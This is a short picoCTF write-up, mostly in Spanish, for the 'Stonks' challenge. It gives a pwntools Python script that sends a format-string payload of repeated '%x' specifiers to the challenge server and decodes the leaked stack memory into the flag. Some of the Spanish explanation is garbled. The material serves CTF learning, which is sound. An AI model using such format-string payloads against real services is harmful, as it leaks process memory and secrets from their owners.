## Objetivos
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c) `nc mercury.picoctf.net 6989`
## Solucion
Igualmente aqui sera de prueba y error por utilizaremos un programa el cual Luego escribí el siguiente script para conectarme al servidor y enviar un montón de %x (pila de impresiones) antes de leerlo y analizarlo en ascii:
```bash
```python
# import pwntools
from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 53437)

# get to vulnerability
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

# send string to print stack
r.send("%x" + "-%x"*40 + "\n")

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()

# remove unwanted components
x = x[:-1].decode()

# parse to characters
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)
```
## Referencias
[ayuda](https://ctftime.org/writeup/28935)
[video ayuda](https://www.youtube.com/watch?v=ctpQdH-GGqY)


